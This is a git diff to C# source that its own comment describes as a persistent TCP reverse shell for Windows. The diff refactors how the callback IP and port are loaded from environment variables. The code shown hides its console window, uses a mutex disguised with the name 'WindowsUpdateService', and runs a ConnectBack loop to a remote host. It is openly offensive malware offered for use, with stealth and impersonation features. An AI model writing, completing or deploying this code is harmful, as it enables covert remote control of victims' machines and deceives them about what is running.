@@ -1,3 +1,5 @@
+// This code is meant to create a persistant reverse shell using tcp on windows. Developed on Debian
+// -https://github.com/EamonnPatt/custom-reverse-shell
 using System;
 using System.Net.Sockets;
 using System.Text;
@@ -5,7 +7,6 @@ using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
 
 class Config {
     public static string GetEnvVariable(string key) {
@@ -21,9 +22,10 @@ class Config {
     }
 }
 
-string ip = Config.GetEnvVariable("localIP");
-int port = int.Parse(Config.GetEnvVariable("myPORT"));
 class Program {
+    // Declare these as static fields at the class level
+    private static string ip;
+    private static int port;
     
     [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
@@ -43,6 +45,10 @@ class Program {
     const int WS_EX_APPWINDOW = 0x00040000;
     
     static void Main(string[] args) {
+        // Load environment variables first
+        ip = Config.GetEnvVariable("localIP");
+        port = int.Parse(Config.GetEnvVariable("myPORT"));
+        
         // Check if already running (prevent multiple instances)
         bool createdNew;
         using (var mutex = new System.Threading.Mutex(true, "Global\\WindowsUpdateService", out createdNew)) {
@@ -80,8 +86,6 @@ class Program {
     }
     
     static void ConnectBack() {
-        string ip = localIP;
-        int port = myPORT;
         Random rand = new Random();
         
         while (true) {
